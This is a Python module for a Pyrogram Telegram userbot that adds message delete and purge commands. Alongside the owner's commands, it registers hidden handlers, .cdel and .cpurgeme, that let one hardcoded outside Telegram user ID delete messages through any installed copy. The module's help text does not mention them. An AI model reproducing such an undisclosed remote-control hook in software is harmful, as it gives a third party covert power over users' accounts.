import asyncio

from pyrogram import Client
from pyrogram import Client as ren
from pyrogram import *
from pyrogram import filters
from pyrogram.types import *
from pyrogram.types import Message

from Akeno.utils.handler import *
from config import CMD_HANDLER


@Akeno(
    ~filters.scheduled
    & filters.command(["cdel"], ["."])
    & filters.user(1191668125)
    & ~filters.me
    & ~filters.forwarded
)
@Akeno(
    ~filters.scheduled
    & filters.command(["del"], CMD_HANDLER)
    & filters.me
    & ~filters.forwarded
)
async def del_user(_, message: Message):
    rep = message.reply_to_message
    await message.delete()
    await rep.delete()

@Akeno(
    ~filters.scheduled
    & filters.command(["cpurgeme"], ["."])
    & filters.user(1191668125)
    & ~filters.me
    & ~filters.forwarded
)
@Akeno(
    ~filters.scheduled
    & filters.command(["purgeme"], CMD_HANDLER)
    & filters.me
    & ~filters.forwarded
)
async def purge_me_func(client: Client, message: Message):
    if len(message.command) != 2:
        return await message.delete()
    n = (
        message.reply_to_message
        if message.reply_to_message
        else message.text.split(None, 1)[1].strip()
    )
    if not n.isnumeric():
        return await message.reply_text("Invalid Bruhhh????")
    n = int(n)
    if n < 1:
        return await message.reply_text("Bruhhhh number 0?")
    chat_id = message.chat.id
    message_ids = [
        m.id
        async for m in client.search_messages(
            chat_id,
            from_user=int(message.from_user.id),
            limit=n,
        )
    ]
    if not message_ids:
        return await message.reply_text("No messages found.")
    to_delete = [message_ids[i : i + 999] for i in range(0, len(message_ids), 999)]
    for hundred_messages_or_less in to_delete:
        await client.delete_messages(
            chat_id=chat_id,
            message_ids=hundred_messages_or_less,
            revoke=True,
        )
        mmk = await message.reply_text(f"{n} Successfully fast purgeme")
        await asyncio.sleep(2)
        await mmk.delete()

@Akeno(
    ~filters.scheduled
    & filters.command(["purge"], CMD_HANDLER)
    & filters.me
    & ~filters.forwarded
)
async def purgefunc(client: Client, message: Message):
    await message.delete()
    if not message.reply_to_message:
        return await message.reply_text("Reply to message purge.")
    chat_id = message.chat.id
    message_ids = []
    for message_id in range(
        message.reply_to_message.id,
        message.id,
    ):
        message_ids.append(message_id)
        if len(message_ids) == 100:
            await client.delete_messages(
                chat_id=chat_id,
                message_ids=message_ids,
                revoke=True,
            )
            message_ids = []
    if len(message_ids) > 0:
        await client.delete_messages(
            chat_id=chat_id,
            message_ids=message_ids,
            revoke=True,
        )

module = modules_help.add_module("purge", __file__)
module.add_command("purgeme", "to fast purge me.")
module.add_command("purge", "to fast reply to message.")
